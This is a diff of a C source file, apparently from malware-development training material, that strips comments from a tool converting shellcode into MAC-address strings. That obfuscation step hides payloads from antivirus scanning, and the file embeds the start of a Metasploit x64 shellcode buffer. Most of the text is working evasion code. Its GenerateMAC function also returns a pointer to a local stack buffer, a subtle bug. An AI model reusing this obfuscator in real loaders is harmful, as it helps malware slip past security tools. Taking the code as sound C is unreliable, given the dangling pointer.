@@ -1,61 +1,41 @@
-// @NUL0x4C | @mrd0x : MalDevAcademy
-
 #include <Windows.h>
 #include <stdio.h>
 
-// disable error 4996 (caused by sprint)
+// disable error caused by sprint
 #pragma warning (disable:4996)
 
-// Function takes in 6 raw bytes and returns them in a MAC address string format
 char* GenerateMAC(int a, int b, int c, int d, int e, int f) {
 	char Output[64];
-
-	// Creating the MAC address and saving it to the 'Output' variable 
+	
 	sprintf(Output, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X",a, b, c, d, e, f);
-
-	// Optional: Print the 'Output' variable to the console
-	// printf("[i] Output: %s\n", Output);
-
+	
 	return (char*)Output;
 }
 
-// Generate the MAC output representation of the shellcode
-// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
 BOOL GenerateMacOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
 
-	// If the shellcode buffer is null or the size is not a multiple of 6, exit
+	// If the shellcode buffer is not a multiple of 6, exit
 	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 6 != 0){
 		return FALSE;
 	}
 	printf("char* MacArray [%d] = {\n\t", (int)(ShellcodeSize / 6));
-
-	// We will read one shellcode byte at a time, when the total is 6, begin generating the MAC address
-	// The variable 'c' is used to store the number of bytes read. By default, starts at 6.
+	
 	int c = 6, counter = 0;
 	char* Mac = NULL;
 
 	for (int i = 0; i < ShellcodeSize; i++) {
-
-		// Track the number of bytes read and when they reach 6 we enter this if statement to begin generating the MAC address
 		if (c == 6) {
 			counter++;
-			
-			// Generating the MAC address from 6 bytes which begin at i until [i + 5] 
 			Mac = GenerateMAC(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5]);
 			
 			if (i == ShellcodeSize - 6) {
-
-				// Printing the last MAC address
 				printf("\"%s\"", Mac);
 				break;
 			}
 			else {
-				// Printing the MAC address
 				printf("\"%s\", ", Mac);
 			}
 			c = 1;
-
-			// Optional: To beautify the output on the console
 			if (counter % 6 == 0) {
 				printf("\n\t");
 			}
@@ -70,7 +50,7 @@ BOOL GenerateMacOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
 
 
 
-// x64 calc metasploit shellcode {272 bytes + 4 0x00 bytes}
+// x64 calc metasploit shellcode 
 unsigned char rawData[] = {
 	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
 	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
@@ -102,7 +82,6 @@ int main() {
 
 
 	if (!GenerateMacOutput(rawData, sizeof(rawData))) {
-		// if failed, that is sizeof(rawData) isn't a multiple of 6
 		return -1;
 	}
 
